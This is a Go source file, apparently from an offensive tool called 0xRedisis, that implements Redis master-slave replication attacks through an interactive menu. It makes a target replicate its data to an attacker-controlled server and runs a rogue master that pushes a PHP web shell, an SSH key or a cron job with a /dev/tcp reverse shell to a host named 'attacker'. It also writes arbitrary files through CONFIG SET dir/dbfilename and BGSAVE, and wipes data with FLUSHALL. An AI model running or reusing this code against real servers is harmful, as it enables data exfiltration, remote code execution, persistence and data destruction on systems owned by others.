package exploitation

import (
	"0xRedisis/modules/core"
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

func ReplicationAbuse(client *core.RedisClient) {
	fmt.Printf("\n%s=== Master-Slave Replication Abuse ===%s\n", core.ColorBlue, core.ColorNC)

	// Show replication options
	fmt.Printf("\n%s[*]%s Replication Exploitation Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Become slave of attacker Redis server\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Set up rogue master for data exfiltration\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Exploit master-slave to write files\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Chain replication for persistence\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s Reset replication configuration\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-5): ")

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		slaveOfAttacker(client, reader)
	case "2":
		rogueMasterSetup(client, reader)
	case "3":
		replicationFileWrite(client, reader)
	case "4":
		chainReplication(client, reader)
	case "5":
		resetReplication(client, reader)
	default:
		fmt.Printf("%s[-]%s Invalid choice\n", core.ColorRed, core.ColorNC)
	}
}

func slaveOfAttacker(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== SLAVEOF Attack ===%s\n", core.ColorBlue, core.ColorNC)

	// Get attacker IP
	attackerIP := core.GetLocalIP()
	fmt.Printf("%s[*]%s Auto-detected local IP: %s%s%s\n",
		core.ColorBlue, core.ColorNC, core.ColorYellow, attackerIP, core.ColorNC)

	fmt.Print("Use auto-detected IP or enter custom IP (press Enter for auto): ")
	customIP, _ := reader.ReadString('\n')
	customIP = strings.TrimSpace(customIP)

	if customIP != "" {
		attackerIP = customIP
	}

	fmt.Print("Enter Redis port for attacker server (default 6380): ")
	portStr, _ := reader.ReadString('\n')
	portStr = strings.TrimSpace(portStr)

	port := 6380
	if portStr != "" {
		if p, err := strconv.Atoi(portStr); err == nil {
			port = p
		}
	}

	// Start rogue Redis server
	fmt.Printf("%s[*]%s Starting rogue Redis server on port %d...\n",
		core.ColorBlue, core.ColorNC, port)

	rogueServer, err := startRogueRedisServer(port)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to start rogue server: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}
	defer rogueServer.Close()

	fmt.Printf("%s[+]%s Rogue Redis server started\n", core.ColorGreen, core.ColorNC)

	// Execute SLAVEOF command
	fmt.Printf("%s[*]%s Executing SLAVEOF %s %d...\n", core.ColorBlue, core.ColorNC, attackerIP, port)

	result, err := client.SendCommand("SLAVEOF", attackerIP, strconv.Itoa(port))
	if err != nil {
		fmt.Printf("%s[-]%s SLAVEOF failed: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s SLAVEOF result: %s\n", core.ColorGreen, core.ColorNC, strings.TrimSpace(result))

	// Monitor replication
	fmt.Printf("%s[*]%s Monitoring replication status...\n", core.ColorBlue, core.ColorNC)
	monitorReplication(client)

	// Show data exfiltration options
	fmt.Printf("\n%s[*]%s Data will be replicated to attacker server\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s[*]%s Connect to rogue server to access replicated data:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %sredis-cli -h %s -p %d%s\n", core.ColorYellow, attackerIP, port, core.ColorNC)
}

func rogueMasterSetup(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Rogue Master Setup ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter port for rogue master (default 6380): ")
	portStr, _ := reader.ReadString('\n')
	portStr = strings.TrimSpace(portStr)

	port := 6380
	if portStr != "" {
		if p, err := strconv.Atoi(portStr); err == nil {
			port = p
		}
	}

	// Start rogue master with malicious data
	fmt.Printf("%s[*]%s Setting up rogue master with malicious payload...\n", core.ColorBlue, core.ColorNC)

	// Get payload type
	fmt.Printf("\n%s[*]%s Payload Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Web shell\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s SSH key\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Cron job\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Custom payload\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter payload choice (1-4): ")

	payloadChoice, _ := reader.ReadString('\n')
	payloadChoice = strings.TrimSpace(payloadChoice)

	var payload string
	switch payloadChoice {
	case "1":
		payload = "<?php system($_GET['cmd']); ?>"
	case "2":
		payload = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGq... rogue@master"
	case "3":
		payload = "* * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1"
	case "4":
		fmt.Print("Enter custom payload: ")
		payload, _ = reader.ReadString('\n')
		payload = strings.TrimSpace(payload)
	default:
		payload = "<?php system($_GET['cmd']); ?>"
	}

	rogueServer, err := startRogueRedisServerWithPayload(port, payload)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to start rogue master: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}
	defer rogueServer.Close()

	fmt.Printf("%s[+]%s Rogue master started with payload\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s[*]%s Now make target Redis instance a slave of this master\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("   %sCommand: SLAVEOF %s %d%s\n", core.ColorYellow, core.GetLocalIP(), port, core.ColorNC)
}

func replicationFileWrite(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Replication File Write ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter target file path: ")
	filePath, _ := reader.ReadString('\n')
	filePath = strings.TrimSpace(filePath)

	fmt.Print("Enter file content: ")
	content, _ := reader.ReadString('\n')
	content = strings.TrimSpace(content)

	// Parse directory and filename
	pathParts := strings.Split(filePath, "/")
	filename := pathParts[len(pathParts)-1]
	dir := strings.Join(pathParts[:len(pathParts)-1], "/")

	fmt.Printf("%s[*]%s Using replication to write file...\n", core.ColorBlue, core.ColorNC)

	// Set up for file write
	_, err := client.SendCommand("CONFIG", "SET", "dir", dir)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to set directory: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	_, err = client.SendCommand("CONFIG", "SET", "dbfilename", filename)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to set filename: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	// Clear and set content
	_, err = client.SendCommand("FLUSHALL")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to flush database: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	_, err = client.SendCommand("SET", "payload", content)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to set payload: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	// Save to file
	_, err = client.SendCommand("BGSAVE")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to save file: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s File write initiated via replication\n", core.ColorGreen, core.ColorNC)
	fmt.Printf("%s[+]%s Target file: %s%s%s\n", core.ColorGreen, core.ColorNC, core.ColorYellow, filePath, core.ColorNC)
}

func chainReplication(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Chain Replication ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s[*]%s This technique creates a replication chain for persistence\n", core.ColorBlue, core.ColorNC)

	// Get current replication info
	info, err := client.SendCommand("INFO", "replication")
	if err == nil {
		fmt.Printf("%s[*]%s Current replication info:\n", core.ColorBlue, core.ColorNC)
		fmt.Printf("%s%s%s\n", core.ColorYellow, info, core.ColorNC)
	}

	fmt.Print("Enter intermediate Redis server IP: ")
	intermediateIP, _ := reader.ReadString('\n')
	intermediateIP = strings.TrimSpace(intermediateIP)

	fmt.Print("Enter intermediate Redis server port: ")
	intermediatePortStr, _ := reader.ReadString('\n')
	intermediatePortStr = strings.TrimSpace(intermediatePortStr)

	// Set up chain
	fmt.Printf("%s[*]%s Setting up replication chain...\n", core.ColorBlue, core.ColorNC)

	result, err := client.SendCommand("SLAVEOF", intermediateIP, intermediatePortStr)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to set up chain: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Chain replication result: %s\n", core.ColorGreen, core.ColorNC, strings.TrimSpace(result))
	fmt.Printf("%s[*]%s Target is now slave of %s:%s\n", core.ColorBlue, core.ColorNC, intermediateIP, intermediatePortStr)
}

func resetReplication(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Reset Replication ===%s\n", core.ColorBlue, core.ColorNC)

	// Get current replication status
	info, err := client.SendCommand("INFO", "replication")
	if err == nil {
		fmt.Printf("%s[*]%s Current replication status:\n", core.ColorBlue, core.ColorNC)
		lines := strings.Split(info, "\n")
		for _, line := range lines {
			if strings.Contains(line, "role:") || strings.Contains(line, "master_host:") ||
				strings.Contains(line, "master_port:") || strings.Contains(line, "slave") {
				fmt.Printf("   %s%s%s\n", core.ColorYellow, strings.TrimSpace(line), core.ColorNC)
			}
		}
	}

	fmt.Printf("\n%s[*]%s Reset Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s SLAVEOF NO ONE (become master)\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Restart replication service\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Clear all replication data\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter choice (1-3): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		result, err := client.SendCommand("SLAVEOF", "NO", "ONE")
		if err != nil {
			fmt.Printf("%s[-]%s Failed to reset: %s\n", core.ColorRed, core.ColorNC, err.Error())
		} else {
			fmt.Printf("%s[+]%s Reset result: %s\n", core.ColorGreen, core.ColorNC, strings.TrimSpace(result))
			fmt.Printf("%s[+]%s Redis is now a master\n", core.ColorGreen, core.ColorNC)
		}
	case "2":
		fmt.Printf("%s[*]%s Attempting to restart replication...\n", core.ColorBlue, core.ColorNC)
		// This would typically require system-level access
		fmt.Printf("%s[!]%s Manual restart required: systemctl restart redis\n", core.ColorYellow, core.ColorNC)
	case "3":
		fmt.Printf("%s[*]%s Clearing replication data...\n", core.ColorBlue, core.ColorNC)
		client.SendCommand("SLAVEOF", "NO", "ONE")
		client.SendCommand("FLUSHALL")
		fmt.Printf("%s[+]%s Replication data cleared\n", core.ColorGreen, core.ColorNC)
	}
}

func startRogueRedisServer(port int) (net.Listener, error) {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return nil, err
	}

	// Simple Redis protocol handler
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				continue
			}

			go handleRogueRedisConnection(conn)
		}
	}()

	return listener, nil
}

func startRogueRedisServerWithPayload(port int, payload string) (net.Listener, error) {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return nil, err
	}

	// Redis server with malicious payload
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				continue
			}

			go handleRogueRedisConnectionWithPayload(conn, payload)
		}
	}()

	return listener, nil
}

func handleRogueRedisConnection(conn net.Conn) {
	defer conn.Close()

	// Simple RESP protocol responses
	for {
		buffer := make([]byte, 1024)
		n, err := conn.Read(buffer)
		if err != nil {
			return
		}

		command := string(buffer[:n])

		// Handle basic Redis commands
		if strings.Contains(command, "PING") {
			conn.Write([]byte("+PONG\r\n"))
		} else if strings.Contains(command, "INFO") {
			conn.Write([]byte("$50\r\nrole:master\r\nconnected_slaves:1\r\n"))
		} else {
			conn.Write([]byte("+OK\r\n"))
		}
	}
}

func handleRogueRedisConnectionWithPayload(conn net.Conn, payload string) {
	defer conn.Close()

	// Send malicious payload during replication handshake
	conn.Write([]byte(fmt.Sprintf("*3\r\n$3\r\nSET\r\n$7\r\nmalware\r\n$%d\r\n%s\r\n",
		len(payload), payload)))

	handleRogueRedisConnection(conn)
}

func monitorReplication(client *core.RedisClient) {
	for i := 0; i < 10; i++ {
		time.Sleep(1 * time.Second)

		info, err := client.SendCommand("INFO", "replication")
		if err != nil {
			continue
		}

		if strings.Contains(info, "master_link_status:up") {
			fmt.Printf("%s[+]%s Replication link established\n", core.ColorGreen, core.ColorNC)
			break
		}

		fmt.Printf("\r%s[*]%s Waiting for replication... (%d/10)", core.ColorBlue, core.ColorNC, i+1)
	}
}
